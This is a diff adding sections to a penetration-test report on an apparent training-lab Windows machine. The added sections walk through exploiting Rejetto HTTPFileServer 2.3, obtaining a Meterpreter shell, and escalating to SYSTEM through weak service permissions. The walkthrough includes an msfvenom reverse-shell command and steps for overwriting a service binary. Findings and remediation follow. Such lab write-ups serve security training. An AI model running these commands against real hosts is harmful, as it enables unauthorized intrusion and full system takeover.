@@ -13,14 +13,71 @@ Methodology: external network scanning → service enumeration → vulnerability
 
 3. Host Summary
 ```
-Service / Port	             |    Version / Info	           |    Vulnerability Identified
------------------------------|------------------------------------------------------------------------------------------
-HTTP (port 80)	             | Web server — generic	         |    None relevant found
-                             |                               |
-HTTP‑FileServer (port 8080)	 | Rejetto HTTPFileServer 2.3	   |    Remote code execution / write upload (public exploit)
-                             |                               |
-Other open ports —	Not used |                               |
+Service / Port	             |    Version / Info	             Vulnerability Identified
+-----------------------------|---------------------------------------------------------------------------------------------
+HTTP (port 80)	             | Web server — generic	       |   None relevant found
+                             |                             |
+HTTP‑FileServer (port 8080)	 | Rejetto HTTPFileServer 2.3	 |   Remote code execution / write upload (public exploit)
+Other open ports —	Not used |                             |
 ```
+Compromise path: HTTPFileServer 2.3 → upload shell via exploit → Meterpreter shell as user bill → enumeration with PowerUp/WinPEAS → insecure service permissions → replacement of service binary → escalation to SYSTEM → full control.
+
+4. Initial Access
+
+Network scan with RustScan and Nmap identified port 8080 open and running HTTPFileServer.
+Manual visit to port 8080 showed the HTTPFileServer welcome page, confirming version 2.3.
+A public exploit (from Exploit‑DB) for Rejetto HTTPFileServer 2.3 was leveraged to upload a staged shell. A Meterpreter session was obtained under user bill.
+Proof of access: Meterpreter session output: getuid → STEELMOUNTAIN\bill.
+
+5. Privilege Escalation
+
+Uploaded PowerUp.ps1 via Meterpreter to the target’s %TEMP% directory.
+Ran Invoke-AllChecks → identified a misconfigured service AdvancedSystemCareService9, running as SYSTEM, with weak permissions allowing Restart / AppendData.
+Generated a reverse shell executable using msfvenom, named ASCService.exe.
+Via Meterpreter upload, replaced the legitimate service binary located under C:\Program Files (x86)\IObit\Advanced SystemCare\ with ASCService.exe.
+Used sc stop AdvancedSystemCareService9 and then sc start AdvancedSystemCareService9 to trigger execution — obtaining a SYSTEM shell (netcat listener connected).
+
+6. Full Technical Walkthrough (concise)
+```
+export target=<IP>
+rustscan -a $target --ulimit 5000 -- -sC -sV -oA scan
+# identified port 8080 – HTTPFileServer 2.3
+# visited in browser → confirmed version 2.3  
+# exploit via Metasploit / manual exploit → shell as 'bill'  
+meterpreter > upload PowerUp.ps1 C:\Users\bill\AppData\Local\Temp\PowerUp.ps1  
+meterpreter > powershell_shell  
+PS C:\Users\bill\AppData\Local\Temp> . .\PowerUp.ps1; Invoke-AllChecks  
+# found vulnerable service 'AdvancedSystemCareService9' with weak permissions  
+# exit to shell  
+cmd > sc stop AdvancedSystemCareService9  
+# generate reverse shell  
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=4445 -e x86/shikata_ga_nai -f exe -o ASCService.exe  
+# in attacker machine – host ASCService.exe  
+# in Meterpreter – upload ASCService.exe to service path (overwrite)  
+cmd > sc start AdvancedSystemCareService9  
+# attacker catches reverse shell → SYSTEM privileges  
+```
+
+7. Findings
+```
+| ID   | Finding                                                                         | Severity | Impact                                                                    |
+| ---- | ------------------------------------------------------------------------------- | -------- | ------------------------------------------------------------------------- |
+| F-01 | Outdated HTTPFileServer 2.3 — remote file upload / RCE                          | High     | Full remote code execution as SYSTEM possible (initial access)            |
+| F-02 | Service `AdvancedSystemCareService9` with weak permissions (AppendData/Restart) | High     | Local privilege escalation to SYSTEM possible by replacing service binary |
+```
+
+8. Remediation
+
+For F-01: Immediately update or remove HTTPFileServer 2.3. Use a maintained equivalent or disable service if not needed.
+For F-02: Modify permissions on service executable and folder so that only administrators (or SYSTEM) can write or replace the binary. Restrict write/modify access. Use principle of least privilege.
+Implement periodic patch management and service permission reviews.
+Consider host-based hardening: avoid unnecessary third‑party software like “Advanced SystemCare”, especially outdated versions.
+
+9. Conclusion
+
+The target machine was fully compromised using publicly available exploits and a straightforward privilege‑escalation via weak service permissions. The vulnerability chain required no zero‑day and no buffer overflow — only misconfigurations and outdated software. The case demonstrates the effectiveness of combining basic enumeration, public exploits, and privilege‑escalation tools (PowerUp/WinPEAS) to achieve SYSTEM-level compromise. The provided remediation steps significantly reduce risk if applied.
+
+10. Appendix A – Proof of Concept (Full Command & Output Log)
 
 Let's begin by exporting the IP as 'target' in the environment variables:
 ```
